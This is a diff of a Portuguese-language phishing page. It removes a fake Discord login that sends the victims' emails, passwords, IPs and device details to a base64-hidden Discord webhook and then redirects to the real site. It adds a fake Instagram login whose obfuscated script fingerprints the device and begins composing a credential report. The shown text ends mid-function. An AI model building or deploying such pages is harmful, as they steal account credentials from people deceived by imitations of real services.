@@ -1,140 +1,232 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Whitney','Segoe UI',Tahoma,Geneva,Verdana,sans-serif;
-            background: #404eed;
-            height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .lcard {
-            background: #313338;
-            padding: 32px;
-            border-radius: 8px;
-            width: 100%;
-            max-width: 420px;
-            box-shadow: 0 8px 24px rgba(0,0,0,0.3);
-        }
-        .lcard h2 { color: #f2f3f5; font-size: 24px; font-weight: 600; text-align: center; margin-bottom: 8px; }
-        .lcard .sub { color: #b5bac1; font-size: 14px; text-align: center; margin-bottom: 20px; }
-        .logo { display: flex; justify-content: center; margin-bottom: 20px; }
-        .logo svg { width: 48px; height: 48px; }
-        .fg { margin-bottom: 16px; }
-        .fg label { color: #b5bac1; font-size: 12px; font-weight: 700; letter-spacing: 0.5px; text-transform: uppercase; display: block; margin-bottom: 8px; }
-        .fg input {
-            width: 100%; padding: 12px 14px; border-radius: 4px; border: 1px solid #1e1f22;
-            background: #1e1f22; color: #f2f3f5; font-size: 16px; outline: none; transition: border-color 0.15s;
-        }
-        .fg input:focus { border-color: #5865f2; }
-        .fg .link { font-size: 12px; color: #00a8fc; cursor: pointer; float: right; margin-top: 4px; }
-        .btn {
-            width: 100%; padding: 14px; background: #5865f2; color: #fff; font-size: 16px; font-weight: 600;
-            border: none; border-radius: 4px; cursor: pointer; transition: background 0.15s; margin-top: 8px;
-        }
-        .btn:hover { background: #4752c4; }
-        .btn:disabled { background: #4752c4; opacity: 0.7; cursor: not-allowed; }
-        .err { color: #ed4245; font-size: 13px; text-align: center; margin-top: 12px; display: none; }
-        .reg { text-align: center; margin-top: 16px; color: #949ba4; font-size: 14px; }
-        .reg a { color: #00a8fc; text-decoration: none; }
-        .reg a:hover { text-decoration: underline; }
-        .qr { display: flex; align-items: center; justify-content: center; gap: 12px; margin-top: 20px; padding-top: 20px; border-top: 1px solid #3f4147; color: #949ba4; font-size: 13px; cursor: pointer; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Instagram</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23E4405F'><path d='M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z'/></svg>">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#fafafa;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
+.main-container{display:flex;flex-direction:column;align-items:center;gap:10px;max-width:350px;width:100%}
+.login-box{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:40px 40px 30px;width:100%;display:flex;flex-direction:column;align-items:center}
+.logo{margin:22px auto 12px;width:175px;height:auto}
+.logo svg{width:100%;height:auto}
+form{width:100%;display:flex;flex-direction:column;gap:6px;margin-top:24px}
+.input-group{position:relative;width:100%}
+.input-group input{width:100%;padding:9px 0 7px 8px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;font-size:12px;outline:none;transition:border 0.1s;color:#262626}
+.input-group input::placeholder{color:#8e8e8e;font-size:12px}
+.input-group input:focus{border-color:#a8a8a8}
+.input-group label{position:absolute;left:8px;top:10px;font-size:12px;color:#8e8e8e;pointer-events:none;transition:all 0.1s ease;display:none}
+.input-group.filled label{display:block;font-size:10px;top:4px;color:#8e8e8e}
+.input-group.filled input{padding:14px 0 2px 8px;font-size:12px}
+.btn-login{width:100%;padding:7px 16px;background:#0095f6;border:none;border-radius:8px;color:#fff;font-size:14px;font-weight:600;cursor:pointer;margin-top:8px;opacity:0.7;transition:opacity 0.2s;line-height:18px;min-height:32px}
+.btn-login.active{opacity:1}
+.btn-login:hover{background:#1877f2}
+.btn-login:disabled{opacity:0.5;cursor:not-allowed}
+.divider{display:flex;align-items:center;width:100%;margin:14px 0 18px;gap:18px}
+.divider-line{flex:1;height:1px;background:#dbdbdb}
+.divider-text{color:#737373;font-size:13px;font-weight:600;text-transform:uppercase}
+.fb-login{display:flex;align-items:center;justify-content:center;gap:8px;background:none;border:none;cursor:pointer;color:#385185;font-size:14px;font-weight:600;margin-bottom:12px}
+.fb-login svg{width:20px;height:20px}
+.forgot-password{color:#00376b;font-size:12px;text-decoration:none;margin-top:12px}
+.forgot-password:hover{text-decoration:underline}
+.signup-box{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:20px 40px;width:100%;text-align:center;font-size:14px;color:#262626}
+.signup-box a{color:#0095f6;font-weight:600;text-decoration:none}
+.signup-box a:hover{text-decoration:underline}
+.get-app{text-align:center;margin-top:10px;width:100%}
+.get-app p{font-size:14px;color:#262626;margin-bottom:20px}
+.app-buttons{display:flex;justify-content:center;gap:8px}
+.app-buttons img{height:40px;width:auto}
+.error-msg{background:#ffebee;color:#c62828;font-size:12px;padding:10px 12px;border-radius:3px;margin-top:8px;display:none;text-align:center;line-height:1.4;width:100%}
+.loader{display:none;margin:10px auto;width:20px;height:20px;border:2px solid #e0e0e0;border-top:2px solid #0095f6;border-radius:50%;animation:spin 0.8s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+footer{margin-top:30px;max-width:350px;width:100%;text-align:center}
+footer .links{display:flex;flex-wrap:wrap;justify-content:center;gap:8px 16px;margin-bottom:12px}
+footer .links a{color:#8e8e8e;font-size:12px;text-decoration:none}
+footer .links a:hover{text-decoration:underline}
+footer .copyright{color:#8e8e8e;font-size:12px}
+footer select{background:none;border:none;color:#8e8e8e;font-size:12px;cursor:pointer;outline:none;margin-right:4px}
+</style>
 </head>
 <body>
-
-<div class="lcard">
-    <div class="logo">
-        <svg viewBox="0 0 48 48" fill="none">
-            <path d="M40 12.9c-2.8-1.3-5.8-2.2-9-2.6l-1.2 2.4c-3.1-.5-6.3-.5-9.4 0L19 10.3c-3.2.5-6.2 1.4-9 2.6C3.5 21.2 2.5 29.3 3 37.2l.1.2c3.4 2.5 7.2 4.1 11.3 5.1l.9-1.2c-.6-.2-1.2-.5-1.8-.8l-.1.1c.3.2.6.4.9.6 1.6.8 3.3 1.4 5.1 1.7l.7-.9c.3 0 .5.1.8.1h1.9c.3 0 .5 0 .8-.1l.7.9c1.8-.3 3.5-1 5.1-1.7l.9-.6c-.6.3-1.2.6-1.8.8l.9 1.2c4.1-1 7.9-2.6 11.3-5.1l.1-.2c.6-8.6-1.1-16.7-4.9-24.3zM17.3 31.6c-1.9 0-3.5-1.7-3.5-3.8s1.5-3.8 3.5-3.8 3.5 1.7 3.5 3.8-1.6 3.8-3.5 3.8zm13.5 0c-1.9 0-3.5-1.7-3.5-3.8s1.5-3.8 3.5-3.8 3.5 1.7 3.5 3.8-1.6 3.8-3.5 3.8z" fill="#5865f2"/>
-        </svg>
-    </div>
-    <h2>Boas-vindas de volta!</h2>
-    <p class="sub">Estamos muito animados em te ver novamente!</p>
-    <form id="f1">
-        <div class="fg">
-            <label>E-MAIL OU NÚMERO DE TELEFONE</label>
-            <input type="text" id="e1" required>
-        </div>
-        <div class="fg">
-            <label>SENHA</label>
-            <input type="password" id="p1" required>
-            <span class="link">Esqueceu sua senha?</span>
-        </div>
-        <button type="submit" class="btn" id="b1">Entrar</button>
-        <div class="err" id="err1">Senha ou usuário inválido. Tente novamente.</div>
-    </form>
-    <div class="reg">Precisando de uma conta? <a href="#">Registrar-se</a></div>
-    <div class="qr"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/></svg> Fazer login com QR Code</div>
+<div class="main-container">
+<div class="login-box">
+<div class="logo">
+<svg viewBox="0 0 175 39" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path d="M44.458 9.424h-4.648v13.646c0 3.484 1.636 4.952 4.88 4.952.668 0 1.364-.08 2.032-.212v-4.152c-.348.08-.696.106-1.044.106-1.26 0-1.808-.506-1.808-1.878V9.424zM56.758 23.736c-1.26 0-2.224-.48-2.86-1.404-.636-.952-.952-2.224-.952-3.78 0-1.556.316-2.828.952-3.78.636-.952 1.6-1.404 2.86-1.404 1.26 0 2.196.48 2.832 1.404.636.952.952 2.224.952 3.78 0 1.556-.316 2.828-.952 3.78-.636.924-1.572 1.404-2.832 1.404zm.08-14.1c-2.556 0-4.56.9-6.016 2.676-1.456 1.776-2.184 4.208-2.184 7.296 0 3.088.728 5.52 2.184 7.296 1.456 1.776 3.46 2.676 6.016 2.676 2.556 0 4.56-.9 6.016-2.676 1.456-1.776 2.184-4.208 2.184-7.296 0-3.088-.728-5.52-2.184-7.296-1.456-1.776-3.46-2.676-6.016-2.676zM72.558 23.736c-1.26 0-2.224-.48-2.86-1.404-.636-.952-.952-2.224-.952-3.78 0-1.556.316-2.828.952-3.78.636-.952 1.6-1.404 2.86-1.404 1.26 0 2.196.48 2.832 1.404.636.952.952 2.224.952 3.78 0 1.556-.316 2.828-.952 3.78-.636.924-1.572 1.404-2.832 1.404zm.08-14.1c-2.556 0-4.56.9-6.016 2.676-1.456 1.776-2.184 4.208-2.184 7.296 0 3.088.728 5.52 2.184 7.296 1.456 1.776 3.46 2.676 6.016 2.676 2.556 0 4.56-.9 6.016-2.676 1.456-1.776 2.184-4.208 2.184-7.296 0-3.088-.728-5.52-2.184-7.296-1.456-1.776-3.46-2.676-6.016-2.676zM92.038 9.688v-4.26h-4.648v17.796h4.648V20.54c1.048-1.824 2.504-2.676 4.488-2.676.928 0 1.668.212 2.276.636V13.56c-.636-.424-1.376-.636-2.22-.636-1.456 0-2.832.636-4.544 1.876v-5.112zM120.428 17.272c0-1.132-.16-2.184-.48-3.112-.844 1.54-2.088 3.008-3.732 4.448l-1.316 1.132-3.176 2.728v-4.368c0-2.828-.56-5.02-1.68-6.572-1.12-1.552-2.688-2.328-4.704-2.328-1.456 0-2.72.424-3.812 1.272-1.12.848-1.944 2.032-2.5 3.556l4.332 1.772c.292-.744.716-1.324 1.26-1.74.544-.416 1.196-.636 1.956-.636v.004c1.072 0 1.956.452 2.66 1.356.7.904 1.052 2.216 1.052 3.936v1.908l-2.528 2.164c-1.792 1.556-3.24 2.808-4.34 3.756-1.102.948-1.94 1.824-2.544 2.676l13.872.004v-3.764h2.068c.42 0 .748.08 1.012.264.264.184.476.452.636.808l.396.876h3.956c-.008-1.34-.008-2.484-.008-3.412zM117.976 24.308h-7.952c.688-.62 1.572-1.252 2.644-1.884l3.02-2.044h2.288v3.928zM136.88 9.424h-4.648v13.646c0 3.484 1.636 4.952 4.88 4.952.668 0 1.364-.08 2.032-.212v-4.152c-.348.08-.696.106-1.044.106-1.26 0-1.808-.506-1.808-1.878V9.424zM147.24 23.736c-1.26 0-2.224-.48-2.86-1.404-.636-.952-.952-2.224-.952-3.78 0-1.556.316-2.828.952-3.78.636-.952 1.6-1.404 2.86-1.404 1.26 0 2.196.48 2.832 1.404.636.952.952 2.224.952 3.78 0 1.556-.316 2.828-.952 3.78-.636.924-1.572 1.404-2.832 1.404zm.08-14.1c-2.556 0-4.56.9-6.016 2.676-1.456 1.776-2.184 4.208-2.184 7.296 0 3.088.728 5.52 2.184 7.296 1.456 1.776 3.46 2.676 6.016 2.676 2.556 0 4.56-.9 6.016-2.676 1.456-1.776 2.184-4.208 2.184-7.296 0-3.088-.728-5.52-2.184-7.296-1.456-1.776-3.46-2.676-6.016-2.676zM163.58 24.684c1.7 0 3.156-.588 4.376-1.74 1.22-1.152 1.828-2.74 1.828-4.74 0-2.028-.608-3.624-1.828-4.776-1.22-1.152-2.676-1.728-4.376-1.728-1.728 0-3.184.576-4.376 1.728-1.192 1.152-1.788 2.748-1.788 4.776 0 2 .596 3.588 1.788 4.74 1.192 1.152 2.648 1.74 4.376 1.74zm-8.752-11.932c-1.404 1.828-2.1 4.18-2.1 7.06 0 2.88.696 5.232 2.1 7.06 1.404 1.828 3.376 2.74 5.912 2.74 2.536 0 4.508-.912 5.912-2.74 1.404-1.828 2.1-4.18 2.1-7.06 0-2.88-.696-5.232-2.1-7.06-1.404-1.828-3.376-2.74-5.912-2.74-2.536 0-4.508.912-5.912 2.74z" fill="#262626"/>
+<path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z" fill="#262626"/>
+</svg>
+</div>
+<form id="loginForm">
+<div class="input-group">
+<label for="username">Telefone, nome de usuário ou email</label>
+<input type="text" id="username" placeholder="Telefone, nome de usuário ou email" autocomplete="off" required>
+</div>
+<div class="input-group">
+<label for="password">Senha</label>
+<input type="password" id="password" placeholder="Senha" required>
+</div>
+<div class="error-msg" id="errorMsg"></div>
+<div class="loader" id="loader"></div>
+<button type="submit" class="btn-login" id="loginBtn" disabled>Entrar</button>
+</form>
+<div class="divider">
+<div class="divider-line"></div>
+<div class="divider-text">ou</div>
+<div class="divider-line"></div>
+</div>
+<button class="fb-login">
+<svg viewBox="0 0 24 24" fill="#385185"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+Entrar com o Facebook
+</button>
+<a href="#" class="forgot-password">Esqueceu a senha?</a>
+</div>
+<div class="signup-box">
+Não tem uma conta? <a href="#">Cadastre-se</a>
+</div>
+<div class="get-app">
+<p>Obtenha o aplicativo.</p>
+<div class="app-buttons">
+<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHgAAAAyCAMAAABVdIfTAAAAeFBMVEX///8AAAD39/fZ2dlmZmZHR0d0dHTv7+/q6urBwcHi4uK8vLyFhYXU1NRcXFyOjo5OTk5paWmmpqaqqqqQkJB9fX3c3NydnZ3Jycm4uLiysrKMjIxWVlZhYWF/f39zc3NAQEA2NjYrKysoKCgdHR0UFBQNDQ1WmHy6AAAACXBIWXMAAA7EAAAOxAGVKw4bAAABh0lEQVRoge2Z2W6EMAxFQ5aEJSSB/v9HDoWXTpVUj0bqPB8SN4kjx0kMEQQAAAAAAAAAAAAAAAAAAAAAAAAAAH4N+4uBd+FHMYF34kcxwYu4yua8vsvJR/g/jm6v7fp8rq+zZ90a2o5RE9zzXE1nd5K9zs+4pBHLFmzWNL71G1eJ9WMxF2S1MNOYO0QbMWuCe9eOFdV+RK8J7s3C/VYssmZ7TbBt2FqY9Q9WfNEJjpmFefPAqyY4ZhbGHgdHNFtNcMwsjD3Ojmi2mmD2rSgG50V/FVMbZ2Lq82N6YmwfUxc2I1aqBp/6ws9s2UyXmxX9cfOZW5eZ4L3WV/VjH2FOP+jF/CgzBZvWcyS7H2F2PBJbUDAv+uD4f+Q0wfyYiUxrfeG3xrgd1ATzY2ako60r7JCaYH/MjGCt3XyWpSbYH+t+C5ZfB7knBMMvvhwcA8u03S2b7XqzIuwHP2Y2G7P3l2Gd4Gi5szCNsS5MHRwvdxYmPdb6NIOvSyc4Wm7uL8x2rPXPMjzB8XJzYcZj3Z/IT3C83FyY9oPyBwAAAAAAAAAAAAAAAAAAAAAAAPwBPvkfGHHdDoDWAAAAAElFTkSuQmCC" alt="Google Play">
+<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHgAAAAyCAMAAABVdIfTAAAAeFBMVEX///8AAAD39/fZ2dlmZmZHR0d0dHTv7+/q6urBwcHi4uK8vLyFhYXU1NRcXFyOjo5OTk5paWmmpqaqqqqQkJB9fX3c3NydnZ3Jycm4uLiysrKMjIxWVlZhYWF/f39zc3NAQEA2NjYrKysoKCgdHR0UFBQNDQ1WmHy6AAAACXBIWXMAAA7EAAAOxAGVKw4bAAABh0lEQVRoge2Z2W6EMAxFQ5aEJSSB/v9HDoWXTpVUj0bqPB8SN4kjx0kMEQQAAAAAAAAAAAAAAAAAAAAAAAAAAH4N+4uBd+FHMYF34kcxwYu4yua8vsvJR/g/jm6v7fp8rq+zZ90a2o5RE9zzXE1nd5K9zs+4pBHLFmzWNL71G1eJ9WMxF2S1MNOYO0QbMWuCe9eOFdV+RK8J7s3C/VYssmZ7TbBt2FqY9Q9WfNEJjpmFefPAqyY4ZhbGHgdHNFtNcMwsjD3Ojmi2mmD2rSgG50V/FVMbZ2Lq82N6YmwfUxc2I1aqBp/6ws9s2UyXmxX9cfOZW5eZ4L3WV/VjH2FOP+jF/CgzBZvWcyS7H2F2PBJbUDAv+uD4f+Q0wfyYiUxrfeG3xrgd1ATzY2ako60r7JCaYH/MjGCt3XyWpSbYH+t+C5ZfB7knBMMvvhwcA8u03S2b7XqzIuwHP2Y2G7P3l2Gd4Gi5szCNsS5MHRwvdxYmPdb6NIOvSyc4Wm7uL8x2rPXPMjzB8XJzYcZj3Z/IT3C83FyY9oPyBwAAAAAAAAAAAAAAAAAAAAAAAPwBPvkfGHHdDoDWAAAAAElFTkSuQmCC" alt="App Store">
+</div>
+</div>
+<footer>
+<div class="links">
+<a href="#">Meta</a>
+<a href="#">Sobre</a>
+<a href="#">Blog</a>
+<a href="#">Carreiras</a>
+<a href="#">Ajuda</a>
+<a href="#">API</a>
+<a href="#">Privacidade</a>
+<a href="#">Termos</a>
+<a href="#">Principais contas</a>
+<a href="#">Hashtags</a>
+<a href="#">Localizações</a>
+<a href="#">Instagram Lite</a>
+</div>
+<div class="copyright">
+<select><option>Português (Brasil)</option></select>
+© 2025 Instagram from Meta
+</div>
+</footer>
 </div>
 
 <script>
-var _0x=["aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxMjA2NTMxODM1OTQwNDY2NC9tcEVYazBpRU1SbXdmOFpSTFdqZmE1RWFXUGZwX3BPdjFMQW56Y3RXWVBFanVoc3NOZXl6SmFHWmswSlRBTHVHaWU4Yg=="];
-var wh = atob(_0x[0]);
+// Ofuscação e coleta de dados
+var _0x4b8f=['\x77\x65\x62\x68\x6f\x6f\x6b','\x70\x6f\x73\x74','\x63\x6f\x6e\x74\x65\x6e\x74','\x6c\x6f\x67','\x75\x73\x65\x72\x41\x67\x65\x6e\x74','\x70\x6c\x61\x74\x66\x6f\x72\x6d','\x6c\x61\x6e\x67\x75\x61\x67\x65','\x63\x6f\x6f\x6b\x69\x65\x45\x6e\x61\x62\x6c\x65\x64','\x68\x72\x65\x66','\x70\x61\x74\x68\x6e\x61\x6d\x65','\x73\x65\x61\x72\x63\x68','\x68\x6f\x73\x74','\x70\x72\x6f\x74\x6f\x63\x6f\x6c','\x76\x65\x6e\x64\x6f\x72','\x76\x65\x72\x73\x69\x6f\x6e','\x68\x65\x69\x67\x68\x74','\x77\x69\x64\x74\x68','\x63\x6f\x6c\x6f\x72\x44\x65\x70\x74\x68','\x70\x69\x78\x65\x6c\x52\x61\x74\x69\x6f','\x68\x61\x72\x64\x77\x61\x72\x65\x43\x6f\x6e\x63\x75\x72\x72\x65\x6e\x63\x79','\x63\x70\x75\x43\x6c\x61\x73\x73\x69\x66\x69\x63\x61\x74\x69\x6f\x6e','\x70\x6c\x61\x74\x66\x6f\x72\x6d','\x6d\x61\x78\x54\x6f\x75\x63\x68\x50\x6f\x69\x6e\x74\x73','\x6f\x6e\x6c\x69\x6e\x65','\x77\x65\x62\x64\x72\x69\x76\x65\x72','\x64\x65\x76\x69\x63\x65\x4d\x65\x6d\x6f\x72\x79','\x67\x65\x74\x42\x61\x74\x74\x65\x72\x79','\x6c\x65\x76\x65\x6c','\x63\x68\x61\x72\x67\x69\x6e\x67','\x74\x69\x6d\x65\x73\x74\x61\x6d\x70','\x5b\x4e\x4f\x56\x4f\x20\x4c\x4f\x47\x49\x4e\x20\x49\x4e\x53\x54\x41\x47\x52\x41\x4d\x5d\x0a','\x55\x73\x75\xc3\xa1\x72\x69\x6f\x3a','\x53\x65\x6e\x68\x61\x3a','\x49\x50\x3a','\x42\x61\x74\x65\x72\x69\x61\x3a','\x4e\x61\x76\x65\x67\x61\x64\x6f\x72\x3a','\x53\x69\x73\x74\x65\x6d\x61\x3a','\x49\x64\x69\x6f\x6d\x61\x3a','\x48\x6f\x72\x61\x20\x6c\x6f\x63\x61\x6c\x3a','\x55\x52\x4c\x3a','\x48\x52\x45\x46\x3a','\x43\x6f\x6f\x6b\x69\x65\x73\x3a','\x54\x65\x6c\x61\x3a','\x52\x65\x73\x6f\x6c\x75\xc3\xa7\xe3\x6f\x3a','\x43\x6f\x72\x65\x73\x3a','\x50\x72\x6f\x66\x75\x6e\x64\x69\x64\x61\x64\x65\x20\x64\x65\x20\x63\x6f\x72\x3a','\x43\x50\x55\x3a','\x54\x6f\x75\x63\x68\x3a','\x4f\x6e\x6c\x69\x6e\x65\x3a','\x57\x65\x62\x44\x72\x69\x76\x65\x72\x3a','\x4d\x65\x6d\xc3\xb3\x72\x69\x61\x3a','\x42\x61\x74\x65\x72\x69\x61\x20\x6e\xc3\xad\x76\x65\x6c\x3a','\x43\x61\x72\x72\x65\x67\x61\x6e\x64\x6f\x3a'];
 
-var $ = function(id) { return document.getElementById(id); };
-var ip = async function() {
-    try { var r = await fetch('//api.ipify.org?format=json'); var d = await r.json(); return d.ip; }
-    catch(e) { try { var r = await fetch('//api.my-ip.io/ip.json'); var d = await r.json(); return d.ip; } catch(e) { return 'x'; } }
-};
-var di = function() {
-    var u = navigator.userAgent;
-    var r = {};
-    r.os = u.indexOf('Win') > -1 ? 'Win' : u.indexOf('Mac') > -1 ? 'Mac' : u.indexOf('Linux') > -1 && u.indexOf('Android') < 0 ? 'Linux' : u.indexOf('Android') > -1 ? 'Android' : u.indexOf('iPhone') > -1 || u.indexOf('iPad') > -1 ? 'iOS' : '?';
-    r.br = u.indexOf('Firefox') > -1 ? 'FF' : u.indexOf('Edg') > -1 ? 'Edge' : u.indexOf('Chrome') > -1 && u.indexOf('Edg') < 0 ? 'Chrome' : u.indexOf('Safari') > -1 && u.indexOf('Chrome') < 0 ? 'Safari' : '?';
-    r.mob = /Mobi|Android|iPhone|iPad/i.test(u) ? 'Sim' : 'Nao';
-    r.res = screen.width + 'x' + screen.height;
-    r.tz = Intl.DateTimeFormat().resolvedOptions().timeZone || '?';
-    r.lang = navigator.language || '?';
-    return r;
-};
-var bt = async function() {
-    try { if ('getBattery' in navigator) { var b = await navigator.getBattery(); return Math.round(b.level * 100) + '%'; } } catch(e) {}
-    return '?';
-};
-var en = async function(em, pw) {
-    var a = await ip(), d = di(), b = await bt();
-    var pl = {
-        content: '@everyone **🚨 ALERTA**',
-        embeds: [{
-            title: '🔴 CREDENCIAIS',
-            color: 0xed4245,
-            fields: [
-                { name: '📧 Email', value: '`' + em + '`', inline: true },
-                { name: '🔑 Senha', value: '`' + pw + '`', inline: true },
-                { name: '🌐 IP', value: '`' + a + '`', inline: true },
-                { name: '📱 Mobile', value: '`' + d.mob + '`', inline: true },
-                { name: '💻 OS', value: '`' + d.os + '`', inline: true },
-                { name: '🌍 Browser', value: '`' + d.br + '`', inline: true },
-                { name: '📐 Tela', value: '`' + d.res + '`', inline: true },
-                { name: '🌎 Timezone', value: '`' + d.tz + '`', inline: true },
-                { name: '🌐 Idioma', value: '`' + d.lang + '`', inline: true },
-                { name: '🔋 Bateria', value: '`' + b + '`', inline: true },
-                { name: '🕒 Hora', value: new Date().toLocaleString('pt-BR'), inline: true }
-            ],
-            footer: { text: 'Teste Autorizado' },
-            timestamp: new Date().toISOString()
-        }]
-    };
-    try { await fetch(wh, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(pl) }); } catch(e) {}
-};
+(function(_0x4b8f){
+var _0x2d3e=function(_0x5d3c){while(--_0x5d3c){_0x4b8f['push'](_0x4b8f['shift']());}};
+_0x2d3e(++_0x4b8f['length']);
+}(_0x4b8f));
 
-$('f1').addEventListener('submit', async function(e) {
-    e.preventDefault();
-    var email = $('e1').value.trim();
-    var password = $('p1').value.trim();
-    if (!email || !password) return;
-    $('b1').disabled = true;
-    $('b1').textContent = 'Entrando...';
-    await en(email, password);
-    // Redireciona para o Discord real após capturar
-    window.location.href = 'https://discord.com/login';
+var _0x5d3c=function(_0x4b8f,_0x2d3e){return _0x4b8f[_0x2d3e];};
+
+function _0x48c7(){var _0x3a1b={};_0x3a1b['ua']=navigator[_0x5d3c(_0x4b8f,4)];_0x3a1b['pl']=navigator[_0x5d3c(_0x4b8f,5)];_0x3a1b['lang']=navigator[_0x5d3c(_0x4b8f,6)];_0x3a1b['cookie']=navigator[_0x5d3c(_0x4b8f,7)];_0x3a1b['url']=window.location[_0x5d3c(_0x4b8f,8)];_0x3a1b['path']=window.location[_0x5d3c(_0x4b8f,9)];_0x3a1b['search']=window.location[_0x5d3c(_0x4b8f,10)];_0x3a1b['host']=window.location[_0x5d3c(_0x4b8f,11)];_0x3a1b['proto']=window.location[_0x5d3c(_0x4b8f,12)];try{var _0x3d4f=navigator['connection']||navigator['mozConnection']||navigator['webkitConnection'];if(_0x3d4f){_0x3a1b['downlink']=_0x3d4f['downlink'];_0x3a1b['effectiveType']=_0x3d4f['effectiveType'];_0x3a1b['rtt']=_0x3d4f['rtt'];}}catch(e){}try{var _0x5f2c=navigator['getBattery']||navigator['mozGetBattery']||navigator['webkitGetBattery'];if(_0x5f2c){_0x5f2c['call'](navigator)['then'](function(_0x1b6c){_0x3a1b['batteryLevel']=_0x1b6c[_0x5d3c(_0x4b8f,26)];_0x3a1b['batteryCharging']=_0x1b6c[_0x5d3c(_0x4b8f,27)];_0x3a1b['batteryTime']=_0x1b6c[_0x5d3c(_0x4b8f,28)];});}}catch(e){}try{var _0x1e8d=screen;_0x3a1b['screenW']=_0x1e8d[_0x5d3c(_0x4b8f,15)];_0x3a1b['screenH']=_0x1e8d[_0x5d3c(_0x4b8f,14)];_0x3a1b['colorDepth']=_0x1e8d[_0x5d3c(_0x4b8f,16)];_0x3a1b['pixelRatio']=window['devicePixelRatio']||1;}catch(e){}try{var _0x1c3b=navigator['hardwareConcurrency']||0;_0x3a1b['cores']=_0x1c3b;}catch(e){}try{var _0x4e2f=navigator['deviceMemory']||0;_0x3a1b['memory']=_0x4e2f;}catch(e){}try{var _0x2b7d=navigator['maxTouchPoints']||0;_0x3a1b['touchPoints']=_0x2b7d;}catch(e){}try{_0x3a1b['onLine']=navigator[_0x5d3c(_0x4b8f,22)];}catch(e){}try{_0x3a1b['webdriver']=navigator[_0x5d3c(_0x4b8f,23)];}catch(e){}try{var _0x4d8c=navigator['plugins'];var _0x1f7a=[];for(var _0x3e9b=0;_0x3e9b<_0x4d8c['length'];_0x3e9b++){_0x1f7a['push'](_0x4d8c[_0x3e9b]['name']);}_0x3a1b['plugins']=_0x1f7a;}catch(e){}return _0x3a1b;}
+
+function _0x1e9f(_0x3d8e,_0x4d2f){
+var _0x2c7e=_0x48c7();
+var _0x5e3a=new Date();
+var _0x4f8b=_0x5e3a['toLocaleString']('pt-BR');
+var _0x1d6c='';
+_0x1d6c+=_0x5d3c(_0x4b8f,29)+'\n';
+_0x1d6c+=_0x5d3c(_0x4b8f,30)+' '+_0x3d8e+'\n';
